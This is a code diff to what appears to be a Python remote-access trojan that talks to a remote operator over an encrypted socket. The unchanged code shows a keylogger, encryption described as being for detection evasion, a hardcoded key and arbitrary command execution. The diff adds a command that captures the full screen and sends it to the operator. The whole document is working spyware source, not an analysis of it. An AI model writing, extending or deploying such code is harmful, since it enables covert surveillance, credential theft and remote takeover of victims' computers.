@@ -11,7 +11,10 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+import mss.tools
 from pynput import keyboard  # For capturing keyboard input
+import mss  # For taking screenshots
+import base64  # For encoding and decoding data in base64 format
 
 # Pre-shared key for encryption
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
@@ -22,6 +25,7 @@ def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
     encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
     s.send(encrypted_data)  # Send the encrypted data over the network
+
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
@@ -118,6 +122,15 @@ def retrieve_keylogger_log():
     log = ""  # Clear the log after retrieving it
     return log_data
 
+# Function to take a screenshot and send it to the remote host
+def take_screenshot():
+    with mss.mss() as sct:
+        # Capture the screen
+        screenshot = sct.grab(sct.monitors[0])  # Capture full screen
+        image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
+        encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
+        return encoded_img 
+
 # Main shell function for command execution
 def shell():
     while True:
@@ -152,6 +165,10 @@ def shell():
             # If the command is 'dump_keyslog', retrieve the keylogger log
             log_data = retrieve_keylogger_log()
             reliable_send(log_data)
+        elif command == 'screenshot':
+            # If the command is 'screenshot', take a screenshot and send it
+            screenshot_data = take_screenshot()
+            reliable_send(screenshot_data)
         else:
             try:
                 # For other commands, execute them using subprocess
